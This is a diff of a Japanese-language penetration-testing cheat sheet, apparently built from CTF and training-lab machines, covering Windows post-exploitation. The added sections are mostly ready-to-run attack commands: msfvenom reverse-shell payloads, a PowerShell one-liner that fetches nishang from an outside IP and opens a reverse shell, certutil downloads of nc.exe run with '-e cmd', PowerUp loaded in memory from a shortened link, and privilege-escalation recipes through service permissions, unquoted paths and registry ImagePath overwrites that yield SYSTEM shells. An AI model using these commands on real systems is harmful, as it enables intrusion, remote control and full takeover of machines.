@@ -699,7 +699,7 @@ pip install .
 対象サーバにツールを送り込む際に使用。  
 主にnetcatもpowershellも使えないようなときに使う。  
 ```
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp .
 ```
 ```
 C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
@@ -920,7 +920,8 @@ lient.Close()"
   
 Windows
 ```
-msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 –f exe > reverse.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
 ```
 
 Windows(meterpreter):
@@ -980,6 +981,12 @@ set LHOST <ip address>
 set LPORT <port number>
 run
 ```
+
+### meterpreterコマンド
+```
+#meterpreterで使用する有用なコマンドをここに書く
+```
+
 
 ## HttpServer
 ・攻撃者マシンでのサーバ立ち上げ。
@@ -1504,10 +1511,27 @@ https://github.com/jondonas/linux-exploit-suggester-2
 ### チェック項目
 []
 
-### nc.exe reverse_shell
+### 侵入先情報の列挙
 ```
+systeminfo
+echo %username%
+```
+
+###  reverse_shell
+#### msfvenom
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > shell.exe
 rlwrap nc -lvnp 4444
 ```
+
+#### nishang
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.252.239 -Port 4444
+
+rlwrap nc -lvnp 4444
+```
+
+#### netcatを転送
 ```
 certutil.exe -urlcache -split -f "http://10.10.10.1/nc.exe" C:\Windows\Temp\nc.exe
 C:Windows\Temp\nc.exe -e cmd 10.10.10.1 4444
@@ -1528,6 +1552,15 @@ powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destinatio
 ```
 powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
 ```
+```
+被害者(受信側):
+# 共有ディレクトリの列挙
+net view \\10.10.14.11
+# 共有ディレクトリ内のファイルを列挙
+dir \\10.10.10.1\temp
+# ローカルにコピー
+copy \\10.10.10.1\temp\rs.exe rs.exe
+```
 
 #### ファイルの検索
 ```
@@ -1537,18 +1570,10 @@ dir /s /b flag*
 - /s...サブフォルダまで含めたファイルまで検索対象とする
 - /b...ファイル名だけ表示
 
-
 #### SMBを用いたファイル共有
 ```
 攻撃側(送信側):
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp
-```
-
-```
-被害者(受信側):
-net view \\10.10.14.11
-dir \\10.10.10.1\temp
-copy \\10.10.10.1\temp\rs.exe rs.exe
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp .
 ```
 
 ### Powershell
@@ -1558,6 +1583,27 @@ copy \\10.10.10.1\temp\rs.exe rs.exe
 Get-ExecutionPolicy -Scope CurrentUser
 現在のユーザーの実行ポリシーの変更:
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
+
+#### PowerUp.ps1
+```
+# Powershellの起動
+C:> powershell.exe -nop -exec bypass
+
+# PowerUpモジュールのインポート
+PS C:\> Import-Module PowerUp.ps1
+
+# PowerUpの実行(All-Check関数を使用)
+PS C:\> Invoke-AllChecks 
+```
+
+```
+# ワンライナー
+C:\> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+```
+```
+# ディスクに触れずにPowerUpを実行
+C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
 ```
 
 ### Tokenの偽装(token impersonation)
@@ -1625,16 +1671,169 @@ systeminfo > systeminfo.txt
 ./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
 ```
 
-### Unquoted Service Path
+
+### Windowsサービスの悪用
+#### Windowsサービスの操作
+```
+# 現在のユーザーに割り当てられている特権を確認
+whoami /priv
+
+# サービスの構成を照会
+sc qc <Service Name>
+
+# サービスの現在のステータスを確認
+sc query <Service Name>
+
+# サービスの開始および停止
+net start / net stop <Service Name>
+
+# サービスの操作権限の表示(showrightsはSDDL権限と権限値を表示)
+sc sdshow <Service Name> showrights  
+
+(例)
+D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPDT;;;S-1-5-21-3029548963-3893655183-1231094572-1001)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+
+SDDL right       Right value
+----------       -----------
+   GA        -   GENERIC_ALL
+   GR        -   GENERIC_READ
+   GW        -   GENERIC_WRITE
+   GX        -   GENERIC_EXECUTE
+   RC        -   READ_CONTROL
+   SD        -   DELETE
+   WD        -   WRITE_DAC
+   WO        -   WRITE_OWNER
+   RP        -   SERVICE_START
+   WP        -   SERVICE_STOP
+   CC        -   SERVICE_QUERY_CONFIG
+   DC        -   SERVICE_CHANGE_CONFIG
+   LC        -   SERVICE_QUERY_STATUS
+   SW        -   SERVICE_ENUMERATE_DEPENDENTS
+   LO        -   SERVICE_INTERROGATE
+   DT        -   SERVICE_PAUSE_CONTINUE
+   CR        -   SERVICE_USER_DEFINED_CONTROL
+
+↑↑D:はDACL(随時アクセス制御リスト)を指し、S:はSACL(システムアクセス制御リスト)を指す。  
+(A;;RPWPDT;;;S-1-5-21-3029548963-3893655183-1231094572-1001)は、左から(A/D(許可/拒否);;権限;;SID)となる。
+
+# 現在のドメイン名\ユーザ名とSID(Windowsユーザアカウントやユーザグループに与えられる固有の識別番号)を確認
+whoami /user
+
+(例)
+USER INFORMATION
+----------------
+User Name          SID
+================== ==============================================
+steelmountain\bill S-1-5-21-3029548963-3893655183-1231094572-1001
+
+
+今回の場合、SID(A;;RPWPDT;;;S-1-5-21-3029548963-3893655183-1231094572-1001)となっているため、照会したサービスは現在ログインしているユーザーでサービスをstart(RP)/stop(WP)して再起動できることが分かる。
+これらの調査をPowerUp.ps1を利用すると簡便に確認することが可能である。
+```
+
+#### Powershellを利用したサービスの列挙
+```
+powershell -c "Get-Service"
+```
+
+#### WMCIを利用したサービスの列挙
+```
+wmic service list brief
+```
+上記のコマンドでは非常に多くの出力が生成される。  
+下記のコマンドでは動作しているサービス名を見やすい形で出力できる。  
+```
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
+```
+さらに、上記のコマンドをpermissions.txtとして出力することで、icaclsコマンドを利用したアクセス権の確認を行うことができる。
+```
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> permissions.txt
+
+for /f eol^=^"^ delims^=^" %a in (permissions.txt) do cmd.exe /c icacls "%a" >> path.txt
+```
+
+#### sc.exeを利用したサービスの列挙
+```
+sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
+
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+```
+これでicaclsコマンドを使用して1つずつアクセス権限を確認する。
+```
+icacls "C:\path\to\file.exe"
+```
+system32のバイナリは、Windowsによってインストールされるためほとんど正しいとして除外する。
+
+#### 安全でないサービスのプロパティ
+Windowsの各サービスには、特定のサービス固有の各セス許可を定義するACL(アクセス制御リスト)がある。  
+侵入中のユーザー権限で下記のACL権限を持っている場合、権限をエスカレードできる可能性がある。  
+- SERVICE_STOP, SERVICE_START
+- SERVICE_CHANGE, SERVICE_ALL_ACCESS
+
+### Service Exploits - Insecure Service Permissions(安全でないサービスパーミッション)
+「daclsvc」サービスに対する「user」アカウントの権限を確認する。
+```
+accesschk.exe /accepteula -uwcqv user *
+or
+accesschk.exe /accepteula -uwcqv user daclsvc
+```
+上記のコマンドにより、「user」アカウントには「SERVICE_CHANGE_CONFIG」を変更する権限があることを確認する。  
+次に下記のコマンドで「daclsvc」サービスを照会してSYSTEM特権(SERVICE_START_NAME)で実行されることを確認する。
+```
+sc qc daclsvc
+```
+サービス構成を変更し、「BINARY_PATH_NAME(binpath)」をreverse shellペイロードを配置したパスに書き換える。
+```
+sc config daclsvc binpath= "\"C:\Windows\Temp\reverse.exe\""
+```
+最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを獲得できる。
+```
+net start daclsvc
+```
+
+### Service Exploits - Unquoted Service Path(引用符で囲まれていないサービスパス)
 サービスに使用される実行可能ファイルへのパスが引用符で囲まれていない場合に現れる脆弱性。  
+「unquotedsvc」サービスを照会して、システム特権(SERVICE_START_NAME)で実行されていることと、「BINARY_PATH_NAME」が引用符で囲まれておらずスペースが含まれていることを確認する。
+```
+C:\Windows\Temp > sc qc <Service Name>
+
+SERVICE_NAME: <Service Name>
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Unquoted Path Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+accesschk.exeを使用して現在のユーザーグループがC:\Program Files\Unquoted Path Service\ディレクトリへの書き込みが許可されていることを確認する。
+```
+accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+```
+reverse shellペイロードの名前をCommon.exeに変更したものC:\Program Files\Unquoted Path Service\ディレクトリに配置をする。  
+最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを獲得できる。
+```
+net start <Service Name>
+```
+
+別のサービスの悪用：
 ここで権限昇格に使用するサービス名は<AdvancedSystemcareservice9>とする。  
 この脆弱性を悪用する方法は、悪意のある実行可能ファイルをサービスパスのどこかに配置し、サービスパスの次のディレクトリの最初の数文字で始まる名前を付ける。  
 サービスが開始(再起動)されると、悪意のあるバイナリ(reverse shell)が実行され、シェルを取得できる。
 ```
+# 手動による列挙
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
 
 例)AdvancedSystemCareService9  C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+
+# 通常のユーザーがサービスの実行可能ファイルが配置されているディレクトリ等に書き込みアクセスを持っているかどうかを確認
+icacls "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 ```
+
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=9001 -f exe > Advanced.exe
 rlwrap nc -lvnp 9001
@@ -1645,11 +1844,45 @@ sc stop AdvancedSystemcareservice9
 sc start AdvancedSystemcareservice9
 ```
 
+### Service Exploits - Weak Registry Permissions
+accesschk.exeを使用して、Windowsサービスのレジストリエントリが「NT AUTHORITY\INTERACTIVE」グループ（基本的にすべてのログオンユーザー）によって書き込み可能であることを確認する。
+```
+accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<Service Name>
 
-### Weak Registry Permissions
-### DLL Hijacking
-### Weak Services Permissions
-### Executable Installer File Permissions Weakness
+HKLM\System\CurrentControlSet\Services\regsvc
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        KEY_ALL_ACCESS
+  RW BUILTIN\Administrators
+        KEY_ALL_ACCESS
+  RW NT AUTHORITY\INTERACTIVE
+        KEY_ALL_ACCESS
+```
+reverse shellペイロードが配置されているパスを指すようにImagePathレジストリキーを上書きする。
+```
+reg add HKLM\SYSTEM\CurrentControlSet\services\<Service Name> /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\Temp\reverse.exe /f
+```
+最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを獲得できる。
+```
+net start <Service Name>
+```
+
+### Service Exploits - Insecure Service Executables
+
+### Registry - AutoRuns
+### Registry - AlwaysInstallElevated
+### Passwords - Registry
+### Passwords - Saved Creds
+### Passwords - Security Account Manager (SAM)
+### Passwords - Passing the Hash
+### Scheduled Tasks
+### Insecure GUI Apps
+
+### Startup Apps
+
+### Token Impersonation - Rogue Potato
+### Token Impersonation - PrintSpoofer
+### Privilege Escalation Scripts
 
 
 
